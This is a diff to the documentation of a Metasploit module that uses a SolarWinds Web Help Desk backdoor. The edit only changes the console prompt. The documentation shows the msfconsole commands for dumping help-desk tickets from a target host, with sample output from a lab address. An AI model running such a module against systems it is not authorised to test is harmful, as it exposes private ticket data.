@@ -20,9 +20,9 @@ Installation instructions are available [here]
 2. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/gather/solarwinds_webhelpdesk_backdoor 
-msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > set RHOSTS <IP>
-msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
+msf > use auxiliary/gather/solarwinds_webhelpdesk_backdoor 
+msf auxiliary(gather/solarwinds_webhelpdesk_backdoor) > set RHOSTS <IP>
+msf auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
 ```
 
 This should return all the tickets from the Web Help Desk platform.
@@ -37,7 +37,7 @@ The number of tickets to dump to the terminal.
 Running the exploit against Web Help Desk v12.8.1 on Windows 22H2 should result in an output similar to the following:
 
 ```
-msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
+msf auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
 [*] Running module against 192.168.217.145
 
 [*] Running automatic check ("set AutoCheck false" to disable)
